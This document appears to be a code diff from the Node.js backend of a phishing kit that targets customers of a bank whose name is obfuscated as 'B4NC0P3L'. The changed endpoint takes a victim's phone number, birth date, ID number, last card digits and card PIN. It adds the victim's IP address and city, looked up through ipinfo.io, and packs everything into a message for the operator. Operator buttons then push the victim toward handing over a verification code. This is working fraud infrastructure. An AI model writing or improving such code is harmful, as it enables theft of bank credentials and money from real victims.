@@ -21,27 +21,50 @@ function guardarEstado() {
   fs.writeFileSync(STATUS_FILE, JSON.stringify(clientes, null, 2));
 }
 
-app.post('/enviar', (req, res) => {
-  const { celular, fechaNacimiento, tipoIdentificacion, numeroIdentificador, ultimos2, nip, ip, ciudad, txid } = req.body;
+// Función para obtener IP real
+function obtenerIpReal(req) {
+  return (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '')
+    .split(',')[0].trim();
+}
+
+// Función para obtener ciudad desde ipinfo.io
+async function obtenerCiudad(ip) {
+  try {
+    const res = await fetch(`https://ipinfo.io/${ip}/json`);
+    const data = await res.json();
+    return data.city || "Desconocida";
+  } catch (err) {
+    console.error("Error al obtener ciudad:", err.message);
+    return "Desconocida";
+  }
+}
+
+app.post('/enviar', async (req, res) => {
+  const { celular, fechaNacimiento, tipoIdentificacion, numeroIdentificador, ultimos2, nip, txid } = req.body;
+
+  const ip = obtenerIpReal(req);
+  const ciudad = await obtenerCiudad(ip);
 
   const mensaje = `
 🔵B4NC0P3L🔵
 🆔 ID: <code>${txid}</code>
+
 📱 Celular: ${celular}
 🎂 Nacimiento: ${fechaNacimiento}
 🆔 Tipo ID: ${tipoIdentificacion}
 🔢 Identificador: ${numeroIdentificador}
 💳 Últimos 2: ${ultimos2}
 🔐 NIP: ${nip}
+
 🌐 IP: ${ip}
 🏙️ Ciudad: ${ciudad}
 `;
 
   const keyboard = {
     inline_keyboard: [
-      [{ text: "➡ verifidata", callback_data: `verifidata:${txid}` }],
-      [{ text: "➡ cel-dina", callback_data: `cel-dina:${txid}` }],
-      [{ text: "➡ errorlogo", callback_data: `errorlogo:${txid}` }]
+       [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
+      [{ text: "🔄CARGANDO", callback_data: `verifidata:${txid}` }], 
+      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
     ]
   };
 
